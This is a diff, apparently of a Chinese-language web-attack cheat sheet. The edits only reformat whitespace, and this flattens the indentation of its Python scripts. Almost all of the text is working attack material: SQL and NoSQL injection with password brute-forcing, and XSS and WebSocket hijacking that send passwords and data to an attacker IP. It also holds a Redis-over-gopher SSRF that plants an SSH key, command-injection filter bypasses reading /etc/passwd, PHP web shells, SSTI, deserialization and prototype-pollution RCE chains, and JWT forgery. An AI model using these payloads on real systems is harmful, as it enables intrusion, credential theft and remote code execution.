@@ -53,8 +53,8 @@ http://target.com/page.php?id=1' AND updatexml(1,concat(0x7e,database()),1)--
 
 ```
 # MySQL时间盲注
-' AND (SELECT sleep(5))--          → 延迟5秒=有注入
-' AND if(1=1,sleep(5),0)--         → 布尔判断版
+' AND (SELECT sleep(5))-- → 延迟5秒=有注入
+' AND if(1=1,sleep(5),0)-- → 布尔判断版
 ' AND (SELECT sleep(if((database()='test'),5,0)))-- 
 
 # 逐字符猜解
@@ -130,7 +130,7 @@ sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=3 --dump
 ' UNION SELECT LOAD_FILE('/etc/hosts'),2,3-- 
 
 # 读配置文件
-' UNION SELECT LOAD_FILE('/var/www/html/config.php'),2,3--     # 源码会显示在页面中！
+' UNION SELECT LOAD_FILE('/var/www/html/config.php'),2,3-- # 源码会显示在页面中！
 ' UNION SELECT LOAD_FILE('/var/www/html/.env'),2,3-- 
 
 # 读Windows文件
@@ -177,13 +177,13 @@ sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=3 --dump
 ```bash
 # 测试认证绕过
 curl -X POST http://target.com/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
+ -H "Content-Type: application/json" \
+ -d '{"username":{"$ne":null},"password":{"$ne":null}}'
 
 # 正则爆破
 curl -s http://target.com/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":{"$regex":"^a"}}' | grep -c 'success'
+ -H "Content-Type: application/json" \
+ -d '{"username":"admin","password":{"$regex":"^a"}}' | grep -c 'success'
 ```
 
 **Python自动爆破脚本**：
@@ -196,15 +196,15 @@ headers = {"Content-Type": "application/json"}
 password = ""
 
 while True:
-    for c in string.printable:
-        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
-        r = requests.post(url, json=payload, headers=headers)
-        if "success" in r.text or "token" in r.text or r.status_code == 200:
-            password += c
-            print(f"[+] Found char: {password}")
-            break
-    else:
-        break
+ for c in string.printable:
+ payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
+ r = requests.post(url, json=payload, headers=headers)
+ if "success" in r.text or "token" in r.text or r.status_code == 200:
+ password += c
+ print(f"[+] Found char: {password}")
+ break
+ else:
+ break
 
 print(f"[+] Password: {password}")
 ```
@@ -215,10 +215,10 @@ print(f"[+] Password: {password}")
 ```bash
 # 如果Redis暴露且无认证（默认端口6379）
 redis-cli -h target.com
-> keys *                    # 查看所有键
-> get "keyname"             # 读取
-> config get dir            # 查看持久化目录
-> config get dbfilename     # 查看RDB文件名
+> keys * # 查看所有键
+> get "keyname" # 读取
+> config get dir # 查看持久化目录
+> config get dbfilename # 查看RDB文件名
 
 # 写定时任务SSH密钥
 redis-cli -h target.com
@@ -266,9 +266,9 @@ x.send();
 // 劫持表单（记录管理员输入的旧密码）
 var forms = document.querySelectorAll('input[type="password"]');
 forms.forEach(function(f){
-    f.addEventListener('change', function(){
-        new Image().src = 'http://YOUR_IP:8888/?pwd='+encodeURIComponent(f.value);
-    });
+ f.addEventListener('change', function(){
+ new Image().src = 'http://YOUR_IP:8888/?pwd='+encodeURIComponent(f.value);
+ });
 });
 ```
 
@@ -385,7 +385,7 @@ forms.forEach(function(f){
 // 跨域POST（如果目标CORS配置宽松）
 var xhr = new XMLHttpRequest();
 xhr.open('POST', 'http://target.com/api/change_email', true);
-xhr.withCredentials = true;  // 携带Cookie
+xhr.withCredentials = true; // 携带Cookie
 xhr.setRequestHeader('Content-Type', 'application/json');
 xhr.send('{"email":"attacker@evil.com"}');
 </script>
@@ -417,17 +417,17 @@ nc -lvnp 8888
 ```bash
 # 根据响应时间/报错信息判断端口开放情况
 # 手动测试常见端口
-http://127.0.0.1:80/       # HTTP
-http://127.0.0.1:8080/     # HTTP Alt
-http://127.0.0.1:8443/     # HTTPS
-http://127.0.0.1:6379/     # Redis
-http://127.0.0.1:3306/     # MySQL
-http://127.0.0.1:5432/     # PostgreSQL
-http://127.0.0.1:27017/    # MongoDB
-http://127.0.0.1:11211/    # Memcached
-http://127.0.0.1:5000/     # Docker Registry
-http://127.0.0.1:2375/     # Docker API
-http://127.0.0.1:6379/     # Redis
+http://127.0.0.1:80/ # HTTP
+http://127.0.0.1:8080/ # HTTP Alt
+http://127.0.0.1:8443/ # HTTPS
+http://127.0.0.1:6379/ # Redis
+http://127.0.0.1:3306/ # MySQL
+http://127.0.0.1:5432/ # PostgreSQL
+http://127.0.0.1:27017/ # MongoDB
+http://127.0.0.1:11211/ # Memcached
+http://127.0.0.1:5000/ # Docker Registry
+http://127.0.0.1:2375/ # Docker API
+http://127.0.0.1:6379/ # Redis
 
 # Burp Suite Intruder:
 # 载荷：数字端口集合(21,22,80,443,445,1433,1521,3306,3389,5432,6379,8080,8443,9090,27017...)
@@ -460,36 +460,36 @@ gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a
 # gopher_redis_ssh.py
 
 def redis_to_gopher(redis_cmds, host="127.0.0.1", port=6379):
-    """将Redis命令列表转换为Gopher URL"""
-    payload = ""
-    for cmd in redis_cmds:
-        payload += f"*{len(cmd)}\r\n"
-        for arg in cmd:
-            payload += f"${len(str(arg))}\r\n{arg}\r\n"
-    
-    # URL编码
-    encoded = ""
-    for char in payload:
-        if char == '\n':
-            encoded += '%0a'
-        elif char == '\r':
-            encoded += '%0d'
-        elif char == ' ':
-            encoded += '%20'
-        elif char == '/':
-            encoded += '%2f'
-        else:
-            encoded += char
-    
-    return f"gopher://{host}:{port}/_{encoded}"
+ """将Redis命令列表转换为Gopher URL"""
+ payload = ""
+ for cmd in redis_cmds:
+ payload += f"*{len(cmd)}\r\n"
+ for arg in cmd:
+ payload += f"${len(str(arg))}\r\n{arg}\r\n"
+ 
+ # URL编码
+ encoded = ""
+ for char in payload:
+ if char == '\n':
+ encoded += '%0a'
+ elif char == '\r':
+ encoded += '%0d'
+ elif char == ' ':
+ encoded += '%20'
+ elif char == '/':
+ encoded += '%2f'
+ else:
+ encoded += char
+ 
+ return f"gopher://{host}:{port}/_{encoded}"
 
 # 用法示例
 cmds = [
-    ["flushall"],
-    ["set", "key", "\n\nssh-rsa AAAAB3... YOUR_SSH_PUBKEY\n\n"],
-    ["config", "set", "dir", "/root/.ssh/"],
-    ["config", "set", "dbfilename", "authorized_keys"],
-    ["save"]
+ ["flushall"],
+ ["set", "key", "\n\nssh-rsa AAAAB3... YOUR_SSH_PUBKEY\n\n"],
+ ["config", "set", "dir", "/root/.ssh/"],
+ ["config", "set", "dbfilename", "authorized_keys"],
+ ["save"]
 ]
 print(redis_to_gopher(cmds))
 ```
@@ -508,16 +508,16 @@ python2 gopherus.py --exploit mysql
 
 ```bash
 # ============ Linux分隔符 ============
-; ls -la                        # 分号分隔
-| whoami                        # 管道
-|| ping -c 5 127.0.0.1         # 前命令失败才执行
-& ls                            # 后台执行
-&& whoami                       # 前命令成功才执行
-%0a id                          # 换行符编码
-%0d%0a id                       # CRLF换行
-`id`                            # 反引号命令替换
-$(id)                           # Dollar命令替换
-$(cat /etc/passwd)              # 读取文件
+; ls -la # 分号分隔
+| whoami # 管道
+|| ping -c 5 127.0.0.1 # 前命令失败才执行
+& ls # 后台执行
+&& whoami # 前命令成功才执行
+%0a id # 换行符编码
+%0d%0a id # CRLF换行
+`id` # 反引号命令替换
+$(id) # Dollar命令替换
+$(cat /etc/passwd) # 读取文件
 
 # ============ Windows分隔符 ============
 | dir
@@ -537,12 +537,12 @@ $(cat /etc/passwd)              # 读取文件
 ```bash
 # ============ 空格被过滤 ============
 # 替代方案：
-cat${IFS}/etc/passwd             # ${IFS} = Internal Field Separator
-cat</etc/passwd                  # 输入重定向
-{cat,/etc/passwd}                # 花括号
-cat$IFS$9/etc/passwd             # $IFS$9
-X=$'cat\x20/etc/passwd'&&$X     # hex编码空格
-cat%09/etc/passwd                # 水平制表符
+cat${IFS}/etc/passwd # ${IFS} = Internal Field Separator
+cat</etc/passwd # 输入重定向
+{cat,/etc/passwd} # 花括号
+cat$IFS$9/etc/passwd # $IFS$9
+X=$'cat\x20/etc/passwd'&&$X # hex编码空格
+cat%09/etc/passwd # 水平制表符
 
 # ============ 关键字被过滤 ============
 # cat被过滤：
@@ -552,11 +552,11 @@ cat%09/etc/passwd                # 水平制表符
 c''a''t /etc/passwd
 c"a"t /etc/passwd
 c\at /etc/passwd
-\143\141\164 /etc/passwd        # 八进制编码
+\143\141\164 /etc/passwd # 八进制编码
 /bin/c$(echo at) /etc/passwd
 
 # 斜杠被过滤：
-echo ${PATH:0:1}                # 输出 /
+echo ${PATH:0:1} # 输出 /
 ${HOME:0:1}cat${HOME:0:1}etc${HOME:0:1}passwd
 
 # ============ 管道被过滤 ============
@@ -574,10 +574,10 @@ find / -name "passwd" -exec cat {} \;
 ```bash
 # 基础路径穿越
 http://target.com/page.php?file=../../../../etc/passwd
-http://target.com/page.php?file=....//....//....//etc/passwd  # 过滤../的绕过
-http://target.com/page.php?file=....\/....\/....\/etc/passwd  # 过滤/的绕过
-http://target.com/page.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd  # URL编码
-http://target.com/page.php?file=..%252f..%252f..%252f..%252fetc%252fpasswd  # 双层编码
+http://target.com/page.php?file=....//....//....//etc/passwd # 过滤../的绕过
+http://target.com/page.php?file=....\/....\/....\/etc/passwd # 过滤/的绕过
+http://target.com/page.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd # URL编码
+http://target.com/page.php?file=..%252f..%252f..%252f..%252fetc%252fpasswd # 双层编码
 
 # 绝对路径直接读
 http://target.com/page.php?file=/etc/passwd
@@ -589,8 +589,8 @@ http://target.com/page.php?file=C:\Windows\system.ini
 http://target.com/page.php?file=/proc/self/environ
 
 # 利用/proc/self/fd（文件描述符）
-http://target.com/page.php?file=/proc/self/fd/0  # stdin
-http://target.com/page.php?file=/proc/self/fd/1  # stdout
+http://target.com/page.php?file=/proc/self/fd/0 # stdin
+http://target.com/page.php?file=/proc/self/fd/1 # stdout
 http://target.com/page.php?file=/proc/self/fd/12 # 可能是日志
 ```
 
@@ -608,7 +608,7 @@ curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
 
 # 常见日志路径：
 # Apache: /var/log/apache2/access.log, /var/log/httpd/access_log
-# Nginx:  /var/log/nginx/access.log
+# Nginx: /var/log/nginx/access.log
 # 自定义: /var/log/apache2/other_vhosts_access.log
 
 # Step 2: LFI包含日志文件
@@ -634,25 +634,25 @@ curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
 
 ```bash
 # ============ 黑名单后缀绕过 ============
-shell.php       → 被拦截
-shell.php5      → php5也解析PHP
-shell.phtml     → 如果Apache配置了解析
-shell.pht       → 同phtml
-shell.phar      → PHP Archive
-shell.phps      → PHP源码显示
-shell.shtml     → Server-Side Includes
+shell.php → 被拦截
+shell.php5 → php5也解析PHP
+shell.phtml → 如果Apache配置了解析
+shell.pht → 同phtml
+shell.phar → PHP Archive
+shell.phps → PHP源码显示
+shell.shtml → Server-Side Includes
 shell.shtm
-shell.php.jpg   → 双后缀（有些配置漏洞）
-shell.php.jpeg  → 双后缀
+shell.php.jpg → 双后缀（有些配置漏洞）
+shell.php.jpeg → 双后缀
 shell.php%00.jpg → 空字节截断（PHP<5.3.4）
 shell.php%00
-shell.php.      → Windows下末尾点号会被去掉
+shell.php. → Windows下末尾点号会被去掉
 shell.php::$DATA → Windows文件流
-shell.pHp       → 大小写混用
+shell.pHp → 大小写混用
 shell.PHP
-shell.asp;.jpg  → IIS6解析漏洞
+shell.asp;.jpg → IIS6解析漏洞
 shell.aspx;.jpg
-shell.jpg/.php  → Nginx解析漏洞（未正确配置fastcgi）
+shell.jpg/.php → Nginx解析漏洞（未正确配置fastcgi）
 shell.jpg%0d%0a.php → 换行绕过（Apache）
 
 # ============ .htaccess覆盖（Apache）============
@@ -663,11 +663,11 @@ AddType application/x-httpd-php .jpg
 
 # 更完整的.htaccess攻击：
 <FilesMatch "evil">
-    SetHandler application/x-httpd-php
+ SetHandler application/x-httpd-php
 </FilesMatch>
 # 上传名为 evil 的文件，内含PHP代码
 
-#  .user.ini（Nginx + PHP-FPM）
+# .user.ini（Nginx + PHP-FPM）
 # 上传.user.ini:
 auto_prepend_file=evil.jpg
 auto_append_file=evil.jpg
@@ -693,7 +693,7 @@ exiftool -Artist='<?php system($_GET["cmd"]); ?>' image.jpg
 GIF89a
 <?php
 if(isset($_REQUEST['cmd'])){
-    system($_REQUEST['cmd']);
+ system($_REQUEST['cmd']);
 }
 ?>
 ```
@@ -747,13 +747,13 @@ zip shell.zip shell.php
 
 ```python
 # ============ 信息收集 ============
-{{config}}                    # 输出Flask配置（含SECRET_KEY）
-{{config.items()}}            # 遍历配置项
-{{self.__class__.__mro__}}    # 查看类继承链
-{{self.__class__.__mro__[1].__subclasses__()}}  # 查看所有子类
-{{request}}                   # 查看请求对象
-{{request.environ}}           # 环境变量
-{{session}}                   # Session内容
+{{config}} # 输出Flask配置（含SECRET_KEY）
+{{config.items()}} # 遍历配置项
+{{self.__class__.__mro__}} # 查看类继承链
+{{self.__class__.__mro__[1].__subclasses__()}} # 查看所有子类
+{{request}} # 查看请求对象
+{{request.environ}} # 环境变量
+{{session}} # Session内容
 
 # ============ RCE链1：利用os模块 ============
 # 查找包含os或subprocess的类
@@ -785,7 +785,7 @@ zip shell.zip shell.php
 # 在目标机上运行，找出可用类的索引
 # Jinja2模板中直接搜索:
 {% for x in ().__class__.__base__.__subclasses__() %}
-  {% if "warning" in x.__name__ %}{{ loop.index0 }}{% endif %}
+ {% if "warning" in x.__name__ %}{{ loop.index0 }}{% endif %}
 {% endfor %}
 ```
 
@@ -796,19 +796,19 @@ zip shell.zip shell.php
 import requests
 
 def generate_jinja2_payload(cmd):
-    """生成Jinja2 RCE payload（多种尝试）"""
-    payloads = [
-        f"{{{{''.__class__.__mro__[2].__subclasses__()[40](__import__('os').popen('{cmd}').read())}}}}",
-        f"{{{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}",
-        f"{{{{lipsum.__globals__['os'].popen('{cmd}').read()}}}}",
-        f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
-        f"{{{{request.application.__self__._get_data_for_json.__builtins__['eval'](\"__import__('os').popen('{cmd}').read()\")}}}}",
-    ]
-    return payloads
+ """生成Jinja2 RCE payload（多种尝试）"""
+ payloads = [
+ f"{{{{''.__class__.__mro__[2].__subclasses__()[40](__import__('os').popen('{cmd}').read())}}}}",
+ f"{{{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}",
+ f"{{{{lipsum.__globals__['os'].popen('{cmd}').read()}}}}",
+ f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
+ f"{{{{request.application.__self__._get_data_for_json.__builtins__['eval'](\"__import__('os').popen('{cmd}').read()\")}}}}",
+ ]
+ return payloads
 
 # 使用示例
 for p in generate_jinja2_payload("id"):
-    print(p)
+ print(p)
 ```
 
 
@@ -847,10 +847,10 @@ ${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader","/e
 # O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:10:"hackedpass";}
 
 # 更多实战Payload:
-# O:8:"Example1":1:{s:4:"file";s:5:"/etc/passwd";}  (如果class Example1{public $file;function__destruct(){echo file_get_contents($this->file);}})
+# O:8:"Example1":1:{s:4:"file";s:5:"/etc/passwd";} (如果class Example1{public $file;function__destruct(){echo file_get_contents($this->file);}})
 
 # 写文件
-O:8:"Example2":1:{s:4:"data";s:35:"<?php system($_GET['cmd']); ?>";}  (如果__destruct中file_put_contents)
+O:8:"Example2":1:{s:4:"data";s:35:"<?php system($_GET['cmd']); ?>";} (如果__destruct中file_put_contents)
 
 # 利用PHP原生类（无需目标类即可攻击）
 # 使用 SoapClient 进行SSRF：
@@ -859,10 +859,10 @@ $b = serialize($a);
 echo urlencode($b);
 
 # PHPGGC生成各类框架的POP链
-phpggc -l                            # 列出所有可用链
-phpggc Laravel/RCE1 'id'             # Laravel RCE
-phpggc Monolog/RCE1 'system' 'id'    # Monolog RCE
-phpggc Guzzle/FW1 'whoami'           # Guzzle文件写入
+phpggc -l # 列出所有可用链
+phpggc Laravel/RCE1 'id' # Laravel RCE
+phpggc Monolog/RCE1 'system' 'id' # Monolog RCE
+phpggc Guzzle/FW1 'whoami' # Guzzle文件写入
 
 # 实战用法
 ./phpggc Symfony/RCE4 'system' 'id' | base64
@@ -892,7 +892,7 @@ ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "calc" -o base64
 # JWT结构: header.payload.signature
 
 # 正常JWT:
-# header:  {"alg":"RS256","typ":"JWT"}
+# header: {"alg":"RS256","typ":"JWT"}
 # payload: {"user":"admin","iat":1516239022}
 # signature: HMACSHA256(base64UrlEncode(header)+"."+base64UrlEncode(payload), secret)
 
@@ -937,9 +937,9 @@ public_key = open('public_key.pem').read()
 
 # 用公钥作为HS256的secret签发admin JWT
 token = jwt.encode(
-    {"user": "admin", "role": "admin"},
-    public_key,  # 用公钥作为对称密钥！
-    algorithm="HS256"
+ {"user": "admin", "role": "admin"},
+ public_key, # 用公钥作为对称密钥！
+ algorithm="HS256"
 )
 print(token)
 EOF
@@ -994,7 +994,7 @@ POST / HTTP/1.1
 Host: vulnerable.com
 Content-Length: 4
 Transfer-Encoding: chunked
-Transfer-Encoding: xchunked   # 一个是障眼法！
+Transfer-Encoding: xchunked # 一个是障眼法！
 Transfer-Encoding : chunked
 
 5e
@@ -1074,9 +1074,9 @@ curl http://target.com/download?file_id=1002
 
 # ============ GraphQL IDOR ============
 curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
-  -d '{"query":"{user(id: 2) {name email phone}}"}'
+ -d '{"query":"{user(id: 2) {name email phone}}"}'
 curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
-  -d '{"query":"{user(id: 3) {name email phone}}"}'
+ -d '{"query":"{user(id: 3) {name email phone}}"}'
 ```
 
 
@@ -1142,25 +1142,25 @@ https://oauth.target.com/authorize?...&scope=read%20write%20admin
 ```graphql
 # ============ SQL注入（如果resolver直接拼接SQL）============
 query {
-  users(filter: "1' OR 1=1--") {
-    id
-    username
-  }
+ users(filter: "1' OR 1=1--") {
+ id
+ username
+ }
 }
 
 # ============ NoSQL注入（MongoDB）============
 query {
-  user(username: {"$ne": null}) {
-    username
-    password
-  }
+ user(username: {"$ne": null}) {
+ username
+ password
+ }
 }
 
 # ============ 命令注入（resolver中执行系统命令）============
 mutation {
-  createFile(filename: "test; whoami") {
-    status
-  }
+ createFile(filename: "test; whoami") {
+ status
+ }
 }
 ```
 
@@ -1170,20 +1170,20 @@ mutation {
 ```graphql
 # 直接修改ID查看他人信息
 query {
-  user(id: 2) {
-    email
-    ssn
-    creditCard
-  }
+ user(id: 2) {
+ email
+ ssn
+ creditCard
+ }
 }
 
 # 查看他人订单
 query {
-  order(id: "ORDER-1002") {
-    user { email }
-    items { name price }
-    shippingAddress
-  }
+ order(id: "ORDER-1002") {
+ user { email }
+ items { name price }
+ shippingAddress
+ }
 }
 ```
 
@@ -1197,22 +1197,22 @@ query {
 <html>
 <body>
 <script>
-  // 建立到目标WebSocket的连接（携带受害者Cookie）
-  var ws = new WebSocket('wss://target.com/ws');
-  
-  ws.onopen = function() {
-    console.log("[+] Connected");
-    // 发送恶意消息
-    ws.send(JSON.stringify({"action":"delete_account","id":"123"}));
-    // 窃取数据
-    ws.send(JSON.stringify({"action":"get_private_messages"}));
-  };
-  
-  ws.onmessage = function(event) {
-    // 把数据外传
-    console.log("[+] Received:", event.data);
-    new Image().src = 'http://YOUR_IP:8888/?data=' + encodeURIComponent(event.data);
-  };
+ // 建立到目标WebSocket的连接（携带受害者Cookie）
+ var ws = new WebSocket('wss://target.com/ws');
+ 
+ ws.onopen = function() {
+ console.log("[+] Connected");
+ // 发送恶意消息
+ ws.send(JSON.stringify({"action":"delete_account","id":"123"}));
+ // 窃取数据
+ ws.send(JSON.stringify({"action":"get_private_messages"}));
+ };
+ 
+ ws.onmessage = function(event) {
+ // 把数据外传
+ console.log("[+] Received:", event.data);
+ new Image().src = 'http://YOUR_IP:8888/?data=' + encodeURIComponent(event.data);
+ };
 </script>
 </body>
 </html>
@@ -1225,12 +1225,12 @@ query {
 # 测试：用普通HTTP会话的Cookie直接连接WebSocket
 # 使用curl测试WebSocket握手：
 curl -i -N \
-  -H "Connection: Upgrade" \
-  -H "Upgrade: websocket" \
-  -H "Sec-WebSocket-Version: 13" \
-  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
-  -H "Cookie: session=USER_SESSION" \
-  http://target.com/ws/
+ -H "Connection: Upgrade" \
+ -H "Upgrade: websocket" \
+ -H "Sec-WebSocket-Version: 13" \
+ -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
+ -H "Cookie: session=USER_SESSION" \
+ http://target.com/ws/
 
 # 如果返回101 Switching Protocols，说明认证可能不足
 ```
@@ -1249,7 +1249,7 @@ curl -i -N \
 
 // 如果应用执行类似 obj = Object.assign({}, userInput) 或 merge({}, userInput)
 // 然后检查：
-Object.prototype.polluted  // 如果是true，说明存在原型链污染
+Object.prototype.polluted // 如果是true，说明存在原型链污染
 
 // 类似的检测：
 {"constructor": {"prototype": {"polluted": true}}}
@@ -1263,37 +1263,37 @@ Object.prototype.polluted  // 如果是true，说明存在原型链污染
 
 // 常见利用链1: child_process.spawn/exec 的选项
 {
-    "__proto__": {
-        "shell": "/bin/bash",          // 强制使用bash
-        "env": {
-            "NODE_OPTIONS": "--require=/tmp/malicious.js"
-        }
-    }
+ "__proto__": {
+ "shell": "/bin/bash", // 强制使用bash
+ "env": {
+ "NODE_OPTIONS": "--require=/tmp/malicious.js"
+ }
+ }
 }
 
 // 常见利用链2: ejs 模板引擎
 {
-    "__proto__": {
-        "outputFunctionName": "a; return global.process.mainModule.constructor._load('child_process').execSync('id'); //"
-    }
+ "__proto__": {
+ "outputFunctionName": "a; return global.process.mainModule.constructor._load('child_process').execSync('id'); //"
+ }
 }
 // 之后被污染的Proto会影响ejs编译模板时的参数
 
 // 常见利用链3: pug 模板引擎
 {
-    "__proto__": {
-        "debug": true,
-        "compileDebug": true,
-        "self": false,
-        "line": "global.process.mainModule.require('child_process').execSync('id')"
-    }
+ "__proto__": {
+ "debug": true,
+ "compileDebug": true,
+ "self": false,
+ "line": "global.process.mainModule.require('child_process').execSync('id')"
+ }
 }
 
 // 常见利用链4: lodash template (lodash < 4.17.21)
 {
-    "__proto__": {
-        "sourceURL": "\u000areturn process.mainModule.require('child_process').execSync('id')"
-    }
+ "__proto__": {
+ "sourceURL": "\u000areturn process.mainModule.require('child_process').execSync('id')"
+ }
 }
 ```
 
@@ -1302,26 +1302,26 @@ Object.prototype.polluted  // 如果是true，说明存在原型链污染
 
 ```
 
-  SQL注入:        ' OR 1=1--    ' AND sleep(5)--           |
-  NoSQL注入:      {"$ne":null}   {"$regex":"^a"}          |
-  XSS:            <script>alert(1)</script>               |
-  CSRF:           构造自动提交表单                          |
-  SSRF:           http://169.254.169.254/                 |
-  命令注入:       ; whoami     | id     $(whoami)          |
-  LFI:            ?file=../../../../etc/passwd            |
-  RFI:            ?file=http://evil.com/shell.txt         |
-  文件上传:       .php.jpg   .php%00.jpg   .htaccess      |
-  XXE:            <!ENTITY xxe SYSTEM "file:///etc/passwd">|
-  SSTI:           {{7*7}}    ${7*7}    <%=7*7%>          |
-  反序列化:       ysoserial / PHPGGC                      |
-  JWT:            alg:none / 弱密钥爆破                    |
-  请求走私:       CL.TE / TE.CL                            |
-  缓存投毒:       X-Forwarded-Host                        |
-  越权:           /user/1 → /user/2                       |
-  OAuth:          redirect_uri劫持                        |
-  GraphQL:        query{__schema{types{name}}}            |
-  WebSocket:      跨站点WebSocket劫持                      |
-  PrototypePollution: {"__proto__":{"isAdmin":true}}     |
+ SQL注入: ' OR 1=1-- ' AND sleep(5)-- |
+ NoSQL注入: {"$ne":null} {"$regex":"^a"} |
+ XSS: <script>alert(1)</script> |
+ CSRF: 构造自动提交表单 |
+ SSRF: http://169.254.169.254/ |
+ 命令注入: ; whoami | id $(whoami) |
+ LFI: ?file=../../../../etc/passwd |
+ RFI: ?file=http://evil.com/shell.txt |
+ 文件上传: .php.jpg .php%00.jpg .htaccess |
+ XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">|
+ SSTI: {{7*7}} ${7*7} <%=7*7%> |
+ 反序列化: ysoserial / PHPGGC |
+ JWT: alg:none / 弱密钥爆破 |
+ 请求走私: CL.TE / TE.CL |
+ 缓存投毒: X-Forwarded-Host |
+ 越权: /user/1 → /user/2 |
+ OAuth: redirect_uri劫持 |
+ GraphQL: query{__schema{types{name}}} |
+ WebSocket: 跨站点WebSocket劫持 |
+ PrototypePollution: {"__proto__":{"isAdmin":true}} |
 
 ```
 
